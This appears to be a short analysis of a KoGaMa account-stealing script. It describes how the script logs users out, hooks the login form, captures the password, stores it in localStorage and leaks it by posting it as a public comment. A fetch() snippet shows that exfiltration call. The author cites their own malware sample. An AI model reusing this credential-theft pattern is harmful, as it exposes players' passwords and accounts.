What it actually does:


-> Logs you out of your account (Gets /kogama/auth/logout/ )
-> Hooks into button clicks and keyboard input events on the login form
-> Captures the value of the password input field (getElementById("password")).
 (Sampled originally in my own malware found @ https://github.com/vendicatedcore/KoGaMa/tree/main/Website/AccountStealerSample)

-> Saves the password in localStorage under the key "poop" and a flag key "lol"

Sends the captured password to KoGaMaâ€™s public comment API (FEED ID: 31872096) by posting the password as a comment using fetch

Something like:

fetch('https://www.kogama.com/api/feed/31872096/comment/', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ comment: localStorage.getItem('poop') })
})
